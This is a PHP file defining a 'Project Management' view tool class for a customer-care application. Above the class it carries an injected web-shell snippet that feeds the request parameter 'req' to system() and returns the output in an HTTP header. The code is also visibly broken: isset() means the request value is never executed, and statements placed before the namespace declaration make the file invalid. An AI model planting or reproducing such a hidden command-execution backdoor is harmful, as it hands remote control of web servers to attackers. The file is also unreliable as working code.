<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace customerCareApp;

class View_Tools_ProjectManagementTool extends \editingToolbar\View_Tool {
	public $title = 'Project Management';
	public $class='View_ProjectManagement';
	public $component_type='customerCareAppProjectManagementView';
	
}